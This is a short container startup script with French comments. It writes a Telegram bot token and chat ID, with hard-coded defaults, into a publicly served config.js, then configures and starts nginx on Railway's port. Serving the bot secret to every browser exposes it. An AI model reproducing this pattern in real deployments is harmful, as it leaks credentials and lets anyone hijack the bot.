#!/bin/sh
set -e

# Récupérer les variables d'environnement (avec valeurs par défaut)
BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ}"
CHAT_ID="${TELEGRAM_CHAT_ID:-7844330327}"

# Créer le fichier config.js avec les variables
mkdir -p /usr/share/nginx/html

cat > /usr/share/nginx/html/config.js << 'CONFIGEOF'
window.telegramConfig = {
    BOT_TOKEN: 'TELEGRAM_BOT_TOKEN_PLACEHOLDER',
    CHAT_ID: 'TELEGRAM_CHAT_ID_PLACEHOLDER'
};
CONFIGEOF

# Remplacer les placeholders par les vraies valeurs
sed -i "s|TELEGRAM_BOT_TOKEN_PLACEHOLDER|$BOT_TOKEN|g" /usr/share/nginx/html/config.js
sed -i "s|TELEGRAM_CHAT_ID_PLACEHOLDER|$CHAT_ID|g" /usr/share/nginx/html/config.js

# Remplacer le port 80 par le PORT dynamique de Railway
PORT=${PORT:-80}
sed -i "s/listen 80;/listen $PORT;/" /etc/nginx/conf.d/default.conf

# Démarrer Nginx
exec nginx -g "daemon off;"
